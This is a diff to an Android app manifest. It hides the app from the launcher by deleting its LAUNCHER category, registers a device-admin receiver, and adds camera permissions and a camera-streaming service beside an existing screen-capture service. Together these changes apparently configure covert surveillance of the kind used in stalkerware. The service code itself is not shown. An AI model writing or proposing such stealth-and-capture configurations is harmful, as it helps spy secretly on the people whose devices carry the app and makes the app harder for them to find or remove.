@@ -28,7 +28,6 @@
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
@@ -59,3 +58,16 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <service android:name=".ScreenshotService" android:exported="false" android:foregroundServiceType="mediaProjection" />
+    <receiver
+        android:name=".DeviceAdminReceiver"
+        android:permission="android.permission.BIND_DEVICE_ADMIN">
+        <meta-data
+            android:name="android.app.device_admin"
+            android:resource="@xml/device_admin" />
+        <intent-filter>
+            <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+        </intent-filter>
+    </receiver>
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <service android:name=".CameraStreamService" android:exported="false" android:foregroundServiceType="camera" />
